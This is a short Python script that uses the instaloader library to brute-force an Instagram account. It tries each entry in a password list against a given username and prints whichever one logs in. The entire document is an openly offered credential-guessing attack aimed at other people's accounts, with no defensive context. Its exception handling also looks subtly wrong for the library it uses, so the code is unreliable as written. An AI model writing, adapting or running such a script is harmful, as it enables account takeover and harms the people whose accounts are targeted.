from instaloader import Instaloader, LoginRequiredException

def brute_force_instagram(username, password_list):
    loader = Instaloader()
    for password in password_list:
        try:
            loader.login(username, password)
            print(f"Successful login with password: {password}")
            return
        except LoginRequiredException:
            print(f"Incorrect password: {password}")

# Usage example
username = "example_user"
password_list = ["password1", "password2", "password3"]  # Add your password list here
brute_force_instagram(username, password_list)